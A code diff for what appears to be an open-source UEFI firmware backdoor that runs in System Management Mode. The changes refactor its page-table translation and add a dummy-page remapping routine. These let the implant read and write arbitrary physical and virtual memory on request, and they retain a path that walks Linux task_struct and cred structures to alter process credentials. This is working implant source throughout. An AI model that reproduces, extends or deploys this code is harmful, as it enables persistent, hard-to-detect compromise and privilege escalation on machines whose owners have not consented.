@@ -25,13 +25,13 @@
 #include "printf.h"
 #include "debug.h"
 #include "loader.h"
+#include "virtmem.h"
 #include "ovmf.h"
 #include "SmmBackdoor.h"
 
 #include "asm/common_asm.h"
 
 #include "serial.h"
-#include "../../DuetPkg/DxeIpl/X64/VirtualMemory.h"
 
 #pragma warning(disable: 4054)
 #pragma warning(disable: 4055)
@@ -62,16 +62,8 @@ __declspec(allocate(".conf")) INFECTOR_CONFIG m_InfectorConfig =
 
 // MSR registers
 #define IA32_KERNEL_GS_BASE 0xC0000102
-#define IA32_EFER 0xC0000080
 #define MSR_SMM_MCA_CAP 0x17D
 #define MSR_SMM_FEATURE_CONTROL 0x4E0
-
-// IA32_EFER.LME flag
-#define IA32_EFER_LME 0x100                              
-
-// CR* registers bits
-#define CR0_PG  0x80000000
-#define CR4_PAE 0x20
 
 #define MAX_SMRAM_SIZE (0x800000 * 2)
 
@@ -108,12 +100,7 @@ EFI_SMM_PERIODIC_TIMER_DISPATCH2_PROTOCOL *m_PeriodicTimerDispatch = NULL;
 EFI_STATUS PeriodicTimerDispatch2Register(EFI_HANDLE *DispatchHandle);
 EFI_STATUS PeriodicTimerDispatch2Unregister(EFI_HANDLE DispatchHandle);
 
-typedef struct _CONTROL_REGS
-{
-    UINT64 Cr0, Cr3, Cr4;
-
-} CONTROL_REGS,
-*PCONTROL_REGS;
+UINT64 m_DummyPage = 0;
 //--------------------------------------------------------------------------------------
 void ConsolePrint(char *Message)
 {
@@ -233,220 +220,6 @@ BOOLEAN SerialInit(VOID)
     SerialPortInitialize(SERIAL_PORT_NUM, SERIAL_BAUDRATE);
 
 #endif
-
-    return TRUE;
-}
-//--------------------------------------------------------------------------------------
-#define PFN_TO_PAGE(_val_) ((_val_) << PAGE_SHIFT)
-#define PAGE_TO_PFN(_val_) ((_val_) >> PAGE_SHIFT)
-
-// get MPL4 address from CR3 register value
-#define PML4_ADDRESS(_val_) ((_val_) & 0xfffffffffffff000)
-
-// get address translation indexes from virtual address
-#define PML4_INDEX(_addr_) (((_addr_) >> 39) & 0x1ff)
-#define PDPT_INDEX(_addr_) (((_addr_) >> 30) & 0x1ff)
-#define PDE_INDEX(_addr_) (((_addr_) >> 21) & 0x1ff)
-#define PTE_INDEX(_addr_) (((_addr_) >> 12) & 0x1ff)
-
-#define PAGE_OFFSET_4K(_addr_) ((_addr_) & 0xfff)
-#define PAGE_OFFSET_2M(_addr_) ((_addr_) & 0x1fffff)
-
-// PS flag of PDPTE and PDE
-#define PDPTE_PDE_PS 0x80
-
-#define INTERLOCKED_GET(_addr_) InterlockedCompareExchange64((UINT64 *)(_addr_), 0, 0)
-
-#if defined(BACKDOOR_DEBUG_MEM)
-
-#define DbgMsgMem DbgMsg
-
-#else
-
-#define DbgMsgMem
-
-#endif
-
-EFI_STATUS VirtualToPhysical(UINT64 Addr, UINT64 *Ret, UINT64 Cr3)
-{
-    UINT64 PhysAddr = 0;
-    EFI_STATUS Status = EFI_INVALID_PARAMETER;    
-
-    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PML4Entry;    
-
-    DbgMsgMem(__FILE__, __LINE__, __FUNCTION__"(): CR3 is 0x%llx, VA is 0x%llx\r\n", Cr3, Addr);
-
-    PML4Entry.Uint64 = INTERLOCKED_GET(PML4_ADDRESS(Cr3) + PML4_INDEX(Addr) * sizeof(UINT64));
-
-    DbgMsgMem(
-        __FILE__, __LINE__, "PML4E is at 0x%llx[0x%llx]: 0x%llx\r\n", 
-        PML4_ADDRESS(Cr3), PML4_INDEX(Addr), PML4Entry.Uint64
-    );
-
-    if (PML4Entry.Bits.Present)
-    {
-        X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PDPTEntry;
-        PDPTEntry.Uint64 = INTERLOCKED_GET(PFN_TO_PAGE(PML4Entry.Bits.PageTableBaseAddress) + 
-                                           PDPT_INDEX(Addr) * sizeof(UINT64));
-
-        DbgMsgMem(
-            __FILE__, __LINE__, "PDPTE is at 0x%llx[0x%llx]: 0x%llx\r\n", 
-            PFN_TO_PAGE(PML4Entry.Bits.PageTableBaseAddress), PDPT_INDEX(Addr), PDPTEntry.Uint64
-        );
-
-        if (PDPTEntry.Bits.Present)
-        {
-            // check for page size flag
-            if ((PDPTEntry.Uint64 & PDPTE_PDE_PS) == 0)
-            {
-                X64_PAGE_DIRECTORY_ENTRY_4K PDEntry;
-                PDEntry.Uint64 = INTERLOCKED_GET(PFN_TO_PAGE(PDPTEntry.Bits.PageTableBaseAddress) +
-                                                 PDE_INDEX(Addr) * sizeof(UINT64));
-
-                DbgMsgMem(
-                    __FILE__, __LINE__, "PDE is at 0x%llx[0x%llx]: 0x%llx\r\n", 
-                    PFN_TO_PAGE(PDPTEntry.Bits.PageTableBaseAddress), PDE_INDEX(Addr), 
-                    PDEntry.Uint64
-                );
-
-                if (PDEntry.Bits.Present)
-                {
-                    // check for page size flag
-                    if ((PDEntry.Uint64 & PDPTE_PDE_PS) == 0)
-                    {
-                        X64_PAGE_TABLE_ENTRY_4K PTEntry;
-                        PTEntry.Uint64 = INTERLOCKED_GET(PFN_TO_PAGE(PDEntry.Bits.PageTableBaseAddress) +
-                                                         PTE_INDEX(Addr) * sizeof(UINT64));
-
-                        DbgMsgMem(
-                            __FILE__, __LINE__, "PTE is at 0x%llx[0x%llx]: 0x%llx\r\n", 
-                            PFN_TO_PAGE(PDEntry.Bits.PageTableBaseAddress), PTE_INDEX(Addr), 
-                            PTEntry.Uint64
-                        );
-
-                        if (PTEntry.Bits.Present)
-                        {
-                            PhysAddr = PFN_TO_PAGE(PTEntry.Bits.PageTableBaseAddress) +
-                                       PAGE_OFFSET_4K(Addr);
-
-                            Status = EFI_SUCCESS;
-                        }
-                        else
-                        {
-                            DbgMsg(
-                                __FILE__, __LINE__, 
-                                "ERROR: PTE for 0x%llx is not present\r\n", Addr
-                            );
-                        }
-                    }
-                    else
-                    {
-                        PhysAddr = PFN_TO_PAGE(PDEntry.Bits.PageTableBaseAddress) +
-                                   PAGE_OFFSET_2M(Addr);
-
-                        Status = EFI_SUCCESS;
-                    }
-                }
-                else
-                {
-                    DbgMsg(
-                        __FILE__, __LINE__, 
-                        "ERROR: PDE for 0x%llx is not present\r\n", Addr
-                    );
-                }                     
-            }
-            else
-            {
-                DbgMsg(__FILE__, __LINE__, "ERROR: 1Gbyte page\r\n");
-            }
-        }
-        else
-        {
-            DbgMsg(__FILE__, __LINE__, "ERROR: PDPTE for 0x%llx is not present\r\n", Addr);
-        }
-    }
-    else
-    {
-        DbgMsg(__FILE__, __LINE__, "ERROR: PML4E for 0x%llx is not present\r\n", Addr);
-    }
-
-    if (Status == EFI_SUCCESS)
-    {
-        DbgMsg(__FILE__, __LINE__, "Physical address of 0x%llx is 0x%llx\r\n", Addr, PhysAddr);
-
-        if (Ret)
-        {            
-            *Ret = PhysAddr;
-        }
-    }
-
-    return Status;
-}
-
-BOOLEAN VirtualAddrValid(UINT64 Addr, UINT64 Cr3)
-{
-    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PML4Entry;    
-    PML4Entry.Uint64 = *(UINT64 *)(PML4_ADDRESS(Cr3) + PML4_INDEX(Addr) * sizeof(UINT64));
-
-    if (PML4Entry.Bits.Present)
-    {
-        X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PDPTEntry;
-        PDPTEntry.Uint64 = *(UINT64 *)(PFN_TO_PAGE(PML4Entry.Bits.PageTableBaseAddress) + 
-                                       PDPT_INDEX(Addr) * sizeof(UINT64));
-
-        if (PDPTEntry.Bits.Present)
-        {
-            // check for page size flag
-            if ((PDPTEntry.Uint64 & PDPTE_PDE_PS) == 0)
-            {
-                X64_PAGE_DIRECTORY_ENTRY_4K PDEntry;
-                PDEntry.Uint64 = *(UINT64 *)(PFN_TO_PAGE(PDPTEntry.Bits.PageTableBaseAddress) +
-                                             PDE_INDEX(Addr) * sizeof(UINT64));
-
-                if (PDEntry.Bits.Present)
-                {
-                    // check for page size flag
-                    if ((PDEntry.Uint64 & PDPTE_PDE_PS) == 0)
-                    {
-                        X64_PAGE_TABLE_ENTRY_4K PTEntry;
-                        PTEntry.Uint64 = *(UINT64 *)(PFN_TO_PAGE(PDEntry.Bits.PageTableBaseAddress) +
-                                                     PTE_INDEX(Addr) * sizeof(UINT64));
-                        if (PTEntry.Bits.Present)
-                        {
-                            return TRUE;
-                        }
-                    }
-                    else
-                    {
-                        return TRUE;
-                    }
-                }  
-            }
-            else
-            {
-                return TRUE;
-            }
-        }
-    }
-
-    return FALSE;
-}
-//--------------------------------------------------------------------------------------
-BOOLEAN Check_IA_32e(PCONTROL_REGS ControlRegs)
-{
-    UINT64 Efer = __readmsr(IA32_EFER);
-
-    if (!(ControlRegs->Cr0 & CR0_PG))
-    {
-        DbgMsg(__FILE__, __LINE__, "ERROR: CR0.PG is not set\r\n");
-        return FALSE;   
-    }
-
-    if (!(Efer & IA32_EFER_LME))
-    {
-        DbgMsg(__FILE__, __LINE__, "ERROR: IA32_EFER.LME is not set\r\n");
-        return FALSE;
-    }
 
     return TRUE;
 }
@@ -678,14 +451,6 @@ EFI_STATUS SmmCallHandle(UINT64 Code, UINT64 Arg1, UINT64 Arg2, PCONTROL_REGS Co
         {
             UINTN i = 0, Len = PAGE_SIZE;
             UINT64 Addr = 0;
-
-            if (Arg1 == 0)
-            {
-                DbgMsg(__FILE__, __LINE__, "ERROR: Arg1 must be specified\r\n");
-                
-                Status = EFI_INVALID_PARAMETER;
-                goto _end;
-            }
              
             if (Arg2 != 0)
             {
@@ -698,7 +463,7 @@ EFI_STATUS SmmCallHandle(UINT64 Code, UINT64 Arg1, UINT64 Arg2, PCONTROL_REGS Co
                 }
 
                 // use caller specified buffer virtual address
-                if ((Status = VirtualToPhysical(Arg2, &Addr, ControlRegs->Cr3)) == EFI_SUCCESS)
+                if ((Status = VirtualToPhysical(Arg2, &Addr, ControlRegs->Cr3, __readcr3())) == EFI_SUCCESS)
                 {
                     Buff = (PUCHAR)Addr;
                 }              
@@ -713,61 +478,55 @@ EFI_STATUS SmmCallHandle(UINT64 Code, UINT64 Arg1, UINT64 Arg2, PCONTROL_REGS Co
                 }
             }
 
-            if (Code == BACKDOOR_SW_DATA_READ_PHYS_PAGE ||
-                Code == BACKDOOR_SW_DATA_READ_PHYS_DWORD)
-            {
-                DbgMsg(
-                    __FILE__, __LINE__, "Copying data from 0x%llx to "FPTR"\r\n",  
-                    Arg1, Buff
-                );
-            }
-            else if (Code == BACKDOOR_SW_DATA_WRITE_PHYS_PAGE ||
-                     Code == BACKDOOR_SW_DATA_WRITE_PHYS_DWORD)
-            {
-                DbgMsg(
-                    __FILE__, __LINE__, "Copying data from "FPTR" to 0x%llx\r\n",  
-                    Buff, Arg1
-                );   
-            }
-
             if (Code == BACKDOOR_SW_DATA_READ_PHYS_DWORD ||
                 Code == BACKDOOR_SW_DATA_WRITE_PHYS_DWORD)
             {
                 Len = sizeof(UINT32);
             }
 
-            // check for valid address
-            if (VirtualAddrValid(Arg1, __readcr3()))
+            if (Code == BACKDOOR_SW_DATA_READ_PHYS_PAGE ||
+                Code == BACKDOOR_SW_DATA_READ_PHYS_DWORD)
             {
+                DbgMsg(
+                    __FILE__, __LINE__, "Copying %d bytes from 0x%llx to "FPTR"\r\n",  
+                    Len, Arg1, Buff
+                );
+            }
+            else if (Code == BACKDOOR_SW_DATA_WRITE_PHYS_PAGE ||
+                     Code == BACKDOOR_SW_DATA_WRITE_PHYS_DWORD)
+            {
+                DbgMsg(
+                    __FILE__, __LINE__, "Copying %d bytes from "FPTR" to 0x%llx\r\n",  
+                    Len, Buff, Arg1
+                );   
+            }            
+
+            // map physical address
+            if (VirtualAddrRemap(m_DummyPage, Arg1, __readcr3()))
+            {
+                UINT64 TargetAddr = m_DummyPage + PAGE_OFFSET_4K(Arg1);
+
                 for (i = 0; i < Len; i += 1)
                 {
                     // copy memory contents
                     if (Code == BACKDOOR_SW_DATA_READ_PHYS_PAGE ||
                         Code == BACKDOOR_SW_DATA_READ_PHYS_DWORD)
                     {                    
-                        *(Buff + i) = *(PUCHAR)(Arg1 + i);
+                        *(Buff + i) = *(PUCHAR)(TargetAddr + i);
                     }
                     else if (Code == BACKDOOR_SW_DATA_WRITE_PHYS_PAGE ||
                              Code == BACKDOOR_SW_DATA_WRITE_PHYS_DWORD)
                     {
-                        *(PUCHAR)(Arg1 + i) = *(Buff + i);
+                        *(PUCHAR)(TargetAddr + i) = *(Buff + i);
                     }
                 }
-            }
-            else
-            {                
-                for (i = 0; i < Len; i += 1)
-                {
-                    // address is not mapped, fill with zeros
-                    if (Code == BACKDOOR_SW_DATA_READ_PHYS_PAGE ||
-                        Code == BACKDOOR_SW_DATA_READ_PHYS_DWORD)
-                    {                    
-                        *(Buff + i) = 0;
-                    }
-                }
-            }
 
-            Status = EFI_SUCCESS;
+                // revert old mapping
+                VirtualAddrRemap(m_DummyPage, m_DummyPage, __readcr3());
+
+                Status = EFI_SUCCESS;
+            }   
+            
             break;
         }
 
@@ -778,14 +537,6 @@ EFI_STATUS SmmCallHandle(UINT64 Code, UINT64 Arg1, UINT64 Arg2, PCONTROL_REGS Co
         {
             UINTN i = 0, Len = PAGE_SIZE;
             UINT64 Addr = 0;
-
-            if (Arg1 == 0)
-            {
-                DbgMsg(__FILE__, __LINE__, "ERROR: Arg1 must be specified\r\n");
-                
-                Status = EFI_INVALID_PARAMETER;
-                goto _end;
-            }
 
             if (!Check_IA_32e(ControlRegs))
             {
@@ -798,7 +549,7 @@ EFI_STATUS SmmCallHandle(UINT64 Code, UINT64 Arg1, UINT64 Arg2, PCONTROL_REGS Co
             if (Arg2 != 0)
             {
                 // use caller specified buffer virtual address
-                if ((Status = VirtualToPhysical(Arg2, &Addr, ControlRegs->Cr3)) == EFI_SUCCESS)
+                if ((Status = VirtualToPhysical(Arg2, &Addr, ControlRegs->Cr3, __readcr3())) == EFI_SUCCESS)
                 {
                     Buff = (PUCHAR)Addr;
                 }              
@@ -813,44 +564,55 @@ EFI_STATUS SmmCallHandle(UINT64 Code, UINT64 Arg1, UINT64 Arg2, PCONTROL_REGS Co
                 }
             }
 
-            if ((Status = VirtualToPhysical(Arg1, &Addr, ControlRegs->Cr3)) == EFI_SUCCESS)
+            if (VirtualToPhysical(Arg1, &Addr, ControlRegs->Cr3, __readcr3()) == EFI_SUCCESS)
             {
+                if (Code == BACKDOOR_SW_DATA_READ_VIRT_DWORD ||
+                    Code == BACKDOOR_SW_DATA_WRITE_VIRT_DWORD)
+                {
+                    Len = sizeof(UINT32);
+                }
+
                 if (Code == BACKDOOR_SW_DATA_READ_VIRT_PAGE ||
                     Code == BACKDOOR_SW_DATA_READ_VIRT_DWORD)
                 { 
                     DbgMsg(
-                        __FILE__, __LINE__, "Copying page from 0x%llx (VA = 0x%llx) to "FPTR"\r\n",  
-                        Addr, Arg1, Buff
+                        __FILE__, __LINE__, "Copying %d bytes from 0x%llx (VA = 0x%llx) to "FPTR"\r\n",  
+                        Len, Addr, Arg1, Buff
                     );
                 }
                 else if (Code == BACKDOOR_SW_DATA_WRITE_VIRT_PAGE ||
                          Code == BACKDOOR_SW_DATA_WRITE_VIRT_DWORD)
                 {
                     DbgMsg(
-                        __FILE__, __LINE__, "Copying page from "FPTR" to 0x%llx (VA = 0x%llx)\r\n",  
-                        Buff, Addr, Arg1
+                        __FILE__, __LINE__, "Copying %d bytes from "FPTR" to 0x%llx (VA = 0x%llx)\r\n",  
+                        Len, Buff, Addr, Arg1
                     );
-                }
+                }                
 
-                if (Code == BACKDOOR_SW_DATA_READ_PHYS_DWORD ||
-                    Code == BACKDOOR_SW_DATA_WRITE_PHYS_DWORD)
+                // map physical address
+                if (VirtualAddrRemap(m_DummyPage, Addr, __readcr3()))
                 {
-                    Len = sizeof(UINT32);
-                }
+                    UINT64 TargetAddr = m_DummyPage + PAGE_OFFSET_4K(Addr);
 
-                for (i = 0; i < Len; i += 1)
-                {
-                    // copy memory contents
-                    if (Code == BACKDOOR_SW_DATA_READ_VIRT_PAGE ||
-                        Code == BACKDOOR_SW_DATA_READ_VIRT_DWORD)
-                    {                    
-                        *(Buff + i) = *(PUCHAR)(Addr + i);
-                    }
-                    else if (Code == BACKDOOR_SW_DATA_WRITE_VIRT_PAGE ||
-                             Code == BACKDOOR_SW_DATA_WRITE_VIRT_DWORD)
+                    for (i = 0; i < Len; i += 1)
                     {
-                        *(PUCHAR)(Addr + i) = *(Buff + i);
+                        // copy memory contents
+                        if (Code == BACKDOOR_SW_DATA_READ_VIRT_PAGE ||
+                            Code == BACKDOOR_SW_DATA_READ_VIRT_DWORD)
+                        {                    
+                            *(Buff + i) = *(PUCHAR)(TargetAddr + i);
+                        }
+                        else if (Code == BACKDOOR_SW_DATA_WRITE_VIRT_PAGE ||
+                                 Code == BACKDOOR_SW_DATA_WRITE_VIRT_DWORD)
+                        {
+                            *(PUCHAR)(TargetAddr + i) = *(Buff + i);
+                        }
                     }
+
+                    // revert old mapping
+                    VirtualAddrRemap(m_DummyPage, m_DummyPage, __readcr3());
+
+                    Status = EFI_SUCCESS;
                 }
             }
             else
@@ -947,7 +709,7 @@ EFI_STATUS SmmCallHandle(UINT64 Code, UINT64 Arg1, UINT64 Arg2, PCONTROL_REGS Co
 
             DbgMsg(__FILE__, __LINE__, "Syscall address is 0x%llx\r\n", Arg1);
 
-            if ((Status = VirtualToPhysical(Arg1, &Addr, ControlRegs->Cr3)) == EFI_SUCCESS)
+            if ((Status = VirtualToPhysical(Arg1, &Addr, ControlRegs->Cr3, __readcr3())) == EFI_SUCCESS)
             {                
                 /*
                     User mode program (smm_call) passing sys_getuid/euid/gid/egid
@@ -1005,19 +767,19 @@ EFI_STATUS SmmCallHandle(UINT64 Code, UINT64 Arg1, UINT64 Arg2, PCONTROL_REGS Co
                 goto _end;
             }            
 
-            if ((Status = VirtualToPhysical(GsBase, &Addr, ControlRegs->Cr3)) == EFI_SUCCESS)
+            if ((Status = VirtualToPhysical(GsBase, &Addr, ControlRegs->Cr3, __readcr3())) == EFI_SUCCESS)
             {                
                 UINT64 TaskStruct = *(UINT64 *)(Addr + OffsetTaskStruct);   
 
                 DbgMsg(__FILE__, __LINE__, "task_struct is at 0x%llx\r\n", TaskStruct);
 
-                if ((Status = VirtualToPhysical(TaskStruct, &Addr, ControlRegs->Cr3)) == EFI_SUCCESS)
+                if ((Status = VirtualToPhysical(TaskStruct, &Addr, ControlRegs->Cr3, __readcr3())) == EFI_SUCCESS)
                 {
                     UINT64 Cred = *(UINT64 *)(Addr + OffsetCred);   
 
                     DbgMsg(__FILE__, __LINE__, "cred is at 0x%llx\r\n", Cred);
 
-                    if ((Status = VirtualToPhysical(Cred, &Addr, ControlRegs->Cr3)) == EFI_SUCCESS)
+                    if ((Status = VirtualToPhysical(Cred, &Addr, ControlRegs->Cr3, __readcr3())) == EFI_SUCCESS)
                     {
                         int *CredVal = (int *)(Addr + OffsetCredVal);
 
@@ -1538,9 +1300,30 @@ VOID BackdoorEntrySmm(VOID)
     EFI_STATUS Status = EFI_SUCCESS;
     EFI_SMM_PERIODIC_TIMER_DISPATCH2_PROTOCOL *PeriodicTimerDispatch = NULL;
     EFI_SMM_SW_DISPATCH2_PROTOCOL *SwDispatch = NULL;    
+    EFI_PHYSICAL_ADDRESS Addr = 0;
 
     DbgMsg(__FILE__, __LINE__, "Running in SMM\r\n");
-    DbgMsg(__FILE__, __LINE__, "SMM system table is at "FPTR"\r\n", m_Smst);
+    DbgMsg(__FILE__, __LINE__, "SMM system table is at "FPTR"\r\n", m_Smst);    
+
+    // allocate dummy memory page to use as target for VirtualAddrRemap()
+    Status = m_Smst->SmmAllocatePages(
+        AllocateAnyPages,
+        EfiRuntimeServicesData,
+        1, &Addr
+    );
+    if (Status == EFI_SUCCESS)
+    {
+        m_DummyPage = Addr;
+
+        gBS->SetMem((VOID *)Addr, PAGE_SIZE, 0xff);
+
+        DbgMsg(__FILE__, __LINE__, "Dummy page allocated is at "FPTR"\r\n", m_DummyPage);
+    }
+    else
+    {
+        DbgMsg(__FILE__, __LINE__, "SmmAllocatePages() fails: 0x%X\r\n", Status);
+        return;
+    }
 
     #define REGISTER_NOTIFY(_name_)                                 \
                                                                     \
